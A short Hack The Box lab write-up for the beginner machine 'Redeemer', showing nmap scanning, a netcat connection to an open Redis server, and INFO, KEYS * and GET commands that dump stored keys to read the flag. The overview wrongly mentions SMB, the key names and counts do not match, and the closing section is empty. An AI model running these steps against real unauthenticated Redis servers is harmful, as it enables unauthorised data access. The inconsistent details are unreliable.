## Hack The Box – Redeemer
 Overview

Redeemer is a beginner-level HTB machine focused on SMB enumeration and misconfigured file shares.

Goal: Enumerating a Redis server remotely and then dumping its database in order to retrieve
the flag

## Enumeration
Ping ip address target:
```bash
ping <target-ip>
```
scan the IP address for any open ports and services.
```bash
nmap -p- -sV <target-ip>
```

I discovered that port 6379 which is running a Redis server

## Important Thing to Remember in Redi

Redis is usually used for:
- temporary data
- fast retrieval
- real-time applications

## Redis Enumeration Using Netcat
Connecting to the Redis Server

```bash
nc <target-ip> 6379
```
If the connection succeeds, the terminal waits for input, meaning the Redis service is accessible.

## Testing Connection
After connecting, I tested the Redis server using the PING command.
```bash
PING
```
Response:
```bash
+PONG
```

The PONG response confirmed that:
- the Redis server was running
- the connection was successful
- commands could be executed manually
  
## Gathering Server Information
Next, I used the INFO command to gather information about the Redis server.
```bash
INFO
```
This displayed:
- Redis version
- operating system
- memory usage
- connected clients
- database statistics

## Checking the Keyspace Section
Inside the INFO output, I checked the Keyspace section.
```bash
# Keyspace
db0:keys=3,expires=1
```
This means:
- db0 = database index 0
- keys=3 = 3 stored keys
- expires=1 = 1 key has expiration enabled

This showed that only database 0 contained data.
## Selecting the Database
I selected the Redis logical database using:
```bash
SELECT 0
```
Response:
```bash
+OK
```
## Enumerating Stored Keys
After selecting the database, I listed all available keys.
```bash
KEYS *
```
Example output:
- numb
- temp
- stor
- flag

This revealed stored entries inside the Redis database.

## Reading Stored Values

Finally, I retrieved the value of discovered keys using:

```bash
GET num
GET stor
GET flag
```

After that successfully retrieved the flag value from the Redis database.

## What I Learned
- 












